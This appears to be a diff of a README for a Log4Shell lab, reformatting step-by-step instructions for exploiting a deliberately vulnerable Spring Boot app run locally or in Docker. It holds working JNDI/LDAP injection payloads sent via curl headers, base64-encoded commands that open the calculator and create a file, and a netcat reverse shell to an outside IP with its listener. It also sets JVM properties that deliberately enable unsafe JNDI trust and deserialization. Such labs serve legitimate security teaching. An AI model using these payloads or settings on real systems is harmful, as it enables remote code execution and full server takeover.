@@ -82,41 +82,40 @@ $~$
    
     ![create Spring boot app](http://g.recordit.co/UJqn2R3YVo.gif)
 <br/>
-    -  Replace pom.xml with below file & copy below LogController src/main/java a
+     -  Replace pom.xml with below file & copy below LogController src/main/java a
       [pom](pom.xml)
       [LogController](LogController.java)
      - Add below lines in default file created under src/main/java --> *Application.java in main method. 
-      `System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
-		System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");`
-    - Install [kali-linux](https://www.kali.org/docs/introduction/download-official-kali-linux-images/) and execute below command to install docker for executing app in docker container.
-    `sudo apt install docker.io`
-----  
-
+      `System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");'
+      `System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");'
+     - Install [kali-linux](https://www.kali.org/docs/introduction/download-official-kali-linux-images/) and execute below command to install docker for executing app in docker container.
+    `sudo apt install docker.io` 
+### Live Demo:
 I will cover 3 scenarios where the malicious code will execute different outputs on the host system/server.
   1. Open ==calculator== on windows system by executing vulnerable java application on local system.
        - Run the spring boot application as below.
-    ![run app](http://g.recordit.co/AW98phqr4i.gif) 
+    	![run app](http://g.recordit.co/AW98phqr4i.gif) 
        - Use curl to send request to host server with malicious code.
-    `curl <your IP>:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_global/Y2FsYy5leGU=}'` 
-    <br/>
-    ![check calc](http://g.recordit.co/I5a0PeQpkf.gif) 
+    	`curl <your IP>:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_global/Y2FsYy5leGU=}'` 
+    	<br/>
+    	![check calc](http://g.recordit.co/I5a0PeQpkf.gif) 
   2. Creating a ==txt file== inside server after hosting application on docker container.
-    - Host the same application in docker using below commands.
-    `docker pull vamsi13krish/vulnerable-app:latest`
-    `docker run -d --name vulnerable-app -p 8080:8080 vamsi13krish/vulnerable-app`
-    ` curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_unix/dG91Y2ggL3RtcC9wd25lZC50eHQK}'`
-   - Check the docker container for pwned.txt file in /tmp folder using below command
-    `docker exec -it <container ID> ls /tmp`
-  >*_NOTE_*: Use **docker ps** to get container ID 
+    	- Host the same application in docker using below commands.
+    	`docker pull vamsi13krish/vulnerable-app:latest`
+    	`docker run -d --name vulnerable-app -p 8080:8080 vamsi13krish/vulnerable-app`
+    	` curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_unix/dG91Y2ggL3RtcC9wd25lZC50eHQK}'`
+   	- Check the docker container for pwned.txt file in /tmp folder using below command
+    	`docker exec -it <container ID> ls /tmp`
+  	>*_NOTE_*: Use **docker ps** to get container ID 
 
   ![file creation gif](http://g.recordit.co/Bn8ImBR7wn.gif)
   3. Getting complete access to the host server using ==netcat== command that will be passed in malicious code on to host server using log4j vulnerability.
-  - Use below command to convert the required netcat command to base64 encoded string.
-    `echo "nc 172.26.9.117 9999 -e /bin/sh" | base64`
-  - Copy the base64 string and paste after exec_global/ in below command
-    `${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_global/bmMgIDE3Mi4yNi45LjExNyA5OTk5IC1lIC9iaW4vc2gK}`
-  - Now open other terminal and run below command to listen to the port 9999.
-    `nc -nvlp 9999`
-  - Run below Curl command and check the listening terminal again
-    `curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_global/bmMgIDE3Mi4yNi45LjExNyA5OTk5IC1lIC9iaW4vc2gK}'`  
+  	- Use below command to convert the required netcat command to base64 encoded string.
+    	`echo "nc 172.26.9.117 9999 -e /bin/sh" | base64`
+  	- Copy the base64 string and paste after exec_global/ in below command
+   	 `${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_global/bmMgIDE3Mi4yNi45LjExNyA5OTk5IC1lIC9iaW4vc2gK}`
+  	- Now open other terminal and run below command to listen to the port 9999.
+    	`nc -nvlp 9999`
+  	- Run below Curl command and check the listening terminal again
+  	  `curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_global/bmMgIDE3Mi4yNi45LjExNyA5OTk5IC1lIC9iaW4vc2gK}'`  
   ![Boom](http://g.recordit.co/xrvaibjQcF.gif)
